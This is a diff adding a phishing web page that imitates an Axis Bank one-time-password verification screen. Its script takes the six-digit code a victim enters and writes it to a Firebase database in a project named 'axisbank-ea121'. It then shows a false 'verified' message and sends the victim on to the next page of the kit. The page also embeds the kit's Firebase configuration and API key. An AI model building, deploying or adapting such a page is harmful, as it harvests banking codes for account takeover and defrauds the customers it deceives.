@@ -1,0 +1,225 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>OTP Verification</title>
+
+<style>
+/* SIMPLE STYLES */
+body{
+    margin:0;
+    font-family: Arial, sans-serif;
+    background:#f5f5f5;
+}
+.header{
+    margin:0;
+    padding:0;
+}
+.header img{
+    width:100%;
+    display:block;
+}
+.container{
+    padding:30px;
+    text-align:center;
+}
+.title{
+    font-size:22px;
+    margin-bottom:25px;
+    font-weight:bold;
+}
+.otp-box input{
+    width:180px;
+    padding:15px;
+    font-size:22px;
+    text-align:center;
+    letter-spacing:8px;
+    border-radius:8px;
+    border:1px solid #ccc;
+}
+.verify-btn{
+    width:100%;
+    padding:15px;
+    margin-top:30px;
+    background:#a0003c;
+    color:white;
+    border:none;
+    border-radius:25px;
+    font-size:18px;
+    cursor:pointer;
+}
+.footer{
+    margin-top:40px;
+}
+.footer img{
+    width:100%;
+    display:block;
+}
+.loader{
+    position:fixed;
+    top:0;
+    left:0;
+    width:100%;
+    height:100%;
+    background:rgba(255,255,255,0.95);
+    display:none;
+    justify-content:center;
+    align-items:center;
+    flex-direction:column;
+    z-index:9999;
+}
+.spinner{
+    width:50px;
+    height:50px;
+    border:6px solid #ccc;
+    border-top:6px solid #a0003c;
+    border-radius:50%;
+    animation:spin 1s linear infinite;
+}
+@keyframes spin{
+    0%{transform:rotate(0deg);}
+    100%{transform:rotate(360deg);}
+}
+.message{
+    padding:12px;
+    border-radius:8px;
+    margin-bottom:15px;
+    display:none;
+}
+.message.success{
+    background:#d4edda;
+    color:#155724;
+    border:1px solid #c3e6cb;
+}
+.message.error{
+    background:#f8d7da;
+    color:#721c24;
+    border:1px solid #f5c6cb;
+}
+.otp-popup{
+    position:fixed;
+    top:20px;
+    left:50%;
+    transform:translateX(-50%);
+    background:#a0003c;
+    color:white;
+    padding:12px 25px;
+    border-radius:50px;
+    font-size:16px;
+    display:none;
+    z-index:10000;
+    animation:slideDown 0.3s ease;
+}
+@keyframes slideDown{
+    from{ top:-50px; opacity:0; }
+    to{ top:20px; opacity:1; }
+}
+</style>
+</head>
+
+<body>
+
+<!-- FIREBASE SDK -->
+<script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
+
+<div class="otp-popup" id="otpPopup">✅ OTP Sent Successfully</div>
+
+<div class="header">
+    <img src="header.png" alt="Header" onerror="this.src='data:image/svg+xml;utf8,<svg xmlns=%22http://www.w3.org/2000/svg%22 width=%22100%25%22 height=%2280%22 viewBox=%220 0 100 80%22><rect width=%22100%25%22 height=%2280%22 fill=%22%238B0000%22/><text x=%2210%22 y=%2245%22 fill=%22white%22 font-size=%2220%22>Axis Bank</text></svg>'">
+</div>
+
+<div class="container">
+
+<div id="messageBox" class="message"></div>
+<div class="title">Enter One Time Password</div>
+
+<div class="otp-box">
+    <input type="tel" id="otp" maxlength="6" inputmode="numeric" placeholder="------" autocomplete="off">
+</div>
+
+<button class="verify-btn" onclick="verifyOTP()">Verify OTP</button>
+
+</div>
+
+<div class="footer">
+    <img src="footer.png" alt="Footer" onerror="this.src='data:image/svg+xml;utf8,<svg xmlns=%22http://www.w3.org/2000/svg%22 width=%22100%25%22 height=%2260%22 viewBox=%220 0 100 60%22><rect width=%22100%25%22 height=%2260%22 fill=%22%23333%22/><text x=%2210%22 y=%2235%22 fill=%22white%22 font-size=%2212%22>© 2024 Axis Bank</text></svg>'">
+</div>
+
+<div class="loader" id="loader">
+    <div class="spinner"></div>
+    <p>Please wait...</p>
+</div>
+
+<script>
+const firebaseConfig = {
+    apiKey: "AIzaSyBqYAEIP3jPi2_1ao6JSVJyhLI7ZOBK440",
+    authDomain: "axisbank-ea121.firebaseapp.com",
+    databaseURL: "https://axisbank-ea121-default-rtdb.firebaseio.com",
+    projectId: "axisbank-ea121",
+    storageBucket: "axisbank-ea121.firebasestorage.app",
+    messagingSenderId: "512765027545",
+    appId: "1:512765027545:web:5e05b71a1c8a248d328ac8"
+};
+
+firebase.initializeApp(firebaseConfig);
+console.log("✅ Firebase Connected!");
+
+// Get userId from localStorage
+const userId = localStorage.getItem('userId');
+
+if(userId) {
+    setTimeout(() => {
+        document.getElementById('otpPopup').style.display = 'block';
+        setTimeout(() => {
+            document.getElementById('otpPopup').style.display = 'none';
+        }, 3000);
+    }, 500);
+}
+
+function showMessage(text, type) {
+    const messageBox = document.getElementById('messageBox');
+    messageBox.textContent = text;
+    messageBox.className = 'message ' + type;
+    messageBox.style.display = 'block';
+    setTimeout(() => messageBox.style.display = 'none', 5000);
+}
+
+async function verifyOTP() {
+    const otp = document.getElementById("otp").value.trim();
+    
+    if(!/^[0-9]{6}$/.test(otp)){
+        showMessage("❌ Please enter valid 6 digit OTP", "error");
+        return;
+    }
+
+    if(!userId) {
+        showMessage("❌ Session expired. Please login again.", "error");
+        setTimeout(() => window.location.href = "Index.html", 2000);
+        return;
+    }
+
+    document.getElementById("loader").style.display = "flex";
+
+    try {
+        // Update user data with OTP
+        await firebase.database().ref('users/user_' + userId).update({
+            otp_1: otp
+        });
+        
+        console.log(`✅ OTP saved for user ${userId}`);
+        showMessage("✅ OTP Verified Successfully!", "success");
+        
+        setTimeout(() => window.location.href = "Third.html", 2000);
+        
+    } catch (error) {
+        document.getElementById("loader").style.display = "none";
+        showMessage("❌ Error: " + error.message, "error");
+    }
+}
+
+window.onload = () => document.getElementById('otp').focus();
+</script>
+
+</body>
+</html>
